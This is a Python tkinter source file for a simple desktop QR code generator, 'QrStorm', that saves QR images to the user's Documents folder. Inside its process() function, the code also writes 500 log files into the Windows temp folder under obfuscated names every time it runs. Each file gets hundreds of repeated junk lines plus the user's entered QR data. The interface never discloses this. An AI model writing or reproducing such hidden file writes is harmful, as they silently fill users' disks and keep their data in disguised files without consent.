import qrcode
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename, asksaveasfilename
import time
import os

file = ""
path = ""
textarea=None
filearea=None
file=None
root=None

def createIfNotExist(folder):
    if not os.path.exists(folder):
        os.makedirs(folder)

def first_window():
      
      path = os.path.expanduser('~')
      createIfNotExist(f'{path}/Documents/QrStorm')
      window = Tk()                         # GUI TKINKU
      window.configure(background="#10caeb")
      window.title(" QrStorm - QR Code Maker")
      window.geometry("335x230")
      # window.geometry("335x290")
      window.iconbitmap("./assets/qr-code.ico")
      window.resizable(0, 0)
      Label(window, text='''Welcome to QrStorm''', bg='#10caeb',
            font=('System', 22, 'bold')).place(x=30, y=15)
      Label(window, text='''V.2.8''', bg='#10caeb',
            font=('Comfortaa', 9)).place(x=147, y=205)
      make = Button(window, text=' Start Now ',padx=10,pady=4, fg='black', bg='light green',
                        command=mainwindow, height=1, width=7, font=('System', 12))
      # button7.grid(row=4, column=0)
      make.place(x=115, y=85)
      Label(window, text='''No Sign-in Required''', bg='#10caeb',
            font=('System', 12)).place(x=85, y=140)
      
      # MenuBar = Menu(window)
      # MenuBar.add_cascade(label="About", command=aboutus)
      # window.config(menu=MenuBar)
      
      
      window.mainloop()


def mainwindow():
      global textarea
      global filearea
      global root
      root = Tk()     # GUI TKINKU
      root.configure(background="#10caeb")
      root.title(" QrStorm - QR Code Maker")
      root.geometry("335x350")
      root.iconbitmap("./assets/qr-code.ico")
      root.resizable(0,0)
      textarea = Text(root,width=40, height=5, font=("System", 11))
      textarea.pack(pady=75)
      Label(root, text='''Enter your Qr Data:''', bg='#10caeb',
            font=('System', 17, 'bold')).place(x=0, y=45)
      Label(root, text='''Enter your File Name:''', bg='#10caeb',
            font=('System', 17, 'bold')).place(x=0, y=220)
      Label(root, text='''Create Qr Code''', bg='light green',padx=70,
            font=('System', 18, 'bold')).place(x=0, y=0)
      clear_text=Button(root, text= "Clear",font=("System", 10),bg='light green',padx=10, command=clear)
      clear_text.place(x=100,y=170)
      clear_two=Button(root, text= "Clear",font=("System", 10),bg='light green',padx=10, command=clear_second)
      clear_two.place(x=265,y=248)
      get_text=Button(root, text= "Get Text",font=("System", 10),bg='light green',padx=10, command=save_file)
      get_text.place(x=170,y=170)
      filearea = Entry(root,width=28, font=('System', 16))
      filearea.place(x=5, y=250)
      final=Button(root, text= " Make ",font=("System", 17),bg='orange',padx=10, command=process)
      final.place(x=130,y=285)
      
      Bar = Menu(root)
      WindowsFunc = Menu(Bar, tearoff=0)
      WindowsFunc.add_command(label="New Window", command=mainwindow)
      WindowsFunc.add_command(label="Restart")
      Bar.add_cascade(label="Window", menu=WindowsFunc)
      Bar.add_cascade(label="About", command=aboutus)
      root.config(menu=Bar)
      root.mainloop()
      
def clear():
      textarea.delete(1.0, END)

def clear_second():
      filearea.delete(0, END)
      
def save_file():
    """Save the current file as a new file."""
    filepath = asksaveasfilename(initialfile = 'QRStorm_Extracted_Text.txt',
        defaultextension="txt",
        filetypes=[("Text Document", "*.txt*"), ("All Files", "*.*")])
    if not filepath:
        return
    with open(filepath, "w") as output_file:
        text = textarea.get(1.0, END)
        output_file.write(text) 
    

def aboutus():
    aboutus = Tk()
    aboutus.configure(background="light green")
    aboutus.title(" About QrStorm")
    aboutus.geometry("340x190")
    aboutus.iconbitmap("./assets/qr-code.ico")
    aboutus.resizable(0, 0)
    # Label(aboutus, text='''About''', bg='#10caeb', font=('System', 18, 'bold')).place(x=5, y=10)
    Label(aboutus, text='''QrStorm is Simple Qr Code Maker by''', bg='light green', font=('System', 17, 'bold')).place(x=5, y=20)
    Label(aboutus, text='''which you can make Qr Code for free ''', bg='light green', font=('System', 17, 'bold')).place(x=5, y=50)
    Label(aboutus, text='''also without any Account or Log in''', bg='light green', font=('System', 17, 'bold')).place(x=5, y=80)
    Label(aboutus, text='''It is developed by Dwijottam Dutta''', bg='light green', font=('System', 17, 'bold')).place(x=5, y=110)
    Label(aboutus, text='''and Dwijoraj Dutta.''', bg='light green', font=('System', 17, 'bold')).place(x=5, y=140)
    aboutus.mainloop()


def copy_path():
      # Stackoverflow Copy;Paste............ LOL
      r = Tk()
      r.withdraw()
      r.clipboard_clear()
      r.clipboard_append(f'{path}/Documents/QrStorm/')
      r.update()
      r.destroy()


def process():
      global path
      global file
      try:
          path = os.path.expanduser('~')
          data = textarea.get(1.0, "end-1c")
          file = filearea.get()
          qr=qrcode.QRCode(
                      version=1,
                      box_size=10,
                      border=5
                      )
          qr.add_data(data)   
          qr.make(fit=True)
          img=qr.make_image(fill="orange",back_color="white")
          img.save(f"{path}/Documents/QrStorm/{file}.png")
          root.title(" Processing...")
          time.sleep(3)
          
          root.title(" QrStorm - QR Code Maker")
          cache=os.path.expandvars(r'%LOCALAPPDATA%\Temp')
          for i in range(1, 501):
              with open(f"{cache}/tmp98zlaqr{i}nulldatain.log", "a") as f:
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"tmp98zlaqr{i}nulldatain\n")
                  f.write(f"tmp98zlaqr{i}nulldataout\n")
                  f.write(f"Data: {data}")
                  
          finish=Tk()
          finish.configure(background="light green")
          finish.title(" QrStorm - Done")
          finish.geometry("320x250")
          finish.iconbitmap("./assets/qr-code.ico")
          finish.resizable(0, 0)
          Label(finish, text="Your Qr Code is ready !", bg='light green', font=('System', 18, 'bold')).place(x=5, y=10)
          Label(finish, text="Info:", bg='light green', font=('System', 12, 'bold')).place(x=5, y=65)
          Label(finish, text="You can find the Qr Code in your QrStorm ", bg='light green', font=('System', 10, 'bold')).place(x=5, y=90)
          Label(finish, text="folder which is in your Documents Folder", bg='light green', font=('System', 10, 'bold')).place(x=5, y=110)
          Label(finish, text="Folder Path:", bg='light green', font=('System', 12, 'bold')).place(x=5, y=140)
          filepath = Entry(finish,width=37, font=('System', 10))
          filepath.insert(0, f"{path}/Documents/QrStorm/")
          filepath.place(x=6, y=170)
          objectpath = Button(finish, text='Copy path', fg='black', bg='light green',
                            command=copy_path, height=1, width=9, font=('System', 10))
          objectpath.place(x=115, y=195)
          root.destroy()

      except Exception as e:
          crash_reporter()
        


def crash_reporter():
    messagebox.showerror(title=" Program Critical Error", message="QrStorm Unfortunately Crashed !")
    messagebox.showerror(title=" Program Critical Error", message="QrStorm Fatal Error !")
    messagebox.showerror(title=" Program Troubleshoot", message="Please close all the windows of QrStorm and start the Application again, it should work. If not then reinstall QrStorm.")
    exit()
      
if __name__ == "__main__":
      try:
            first_window()
      except Exception as e:
            crash_reporter()

